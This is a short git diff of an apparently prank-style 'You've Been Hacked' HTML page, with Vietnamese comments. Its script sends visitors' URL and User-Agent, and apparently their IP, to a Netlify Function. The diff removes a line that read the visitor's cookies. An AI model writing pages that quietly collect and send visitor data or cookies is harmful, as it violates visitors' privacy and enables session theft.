@@ -6,9 +6,8 @@
     <title>Alert: You've Been Hacked bởi 4 chị em!</title>
     <link rel="stylesheet" href="style.css" />
     <script>
-      // Hàm gửi thông tin về User-Agent, IP, và cookies tới Netlify Function
+      // Hàm gửi thông tin về User-Agent, IP tới Netlify Function
       function sendDataToNetlify() {
-        var cookies = document.cookie; // Lấy cookies của người dùng
         var currentUrl = window.location.href; // Lấy URL của trang
         var userAgent = navigator.userAgent; // Lấy User-Agent của trình duyệt
 
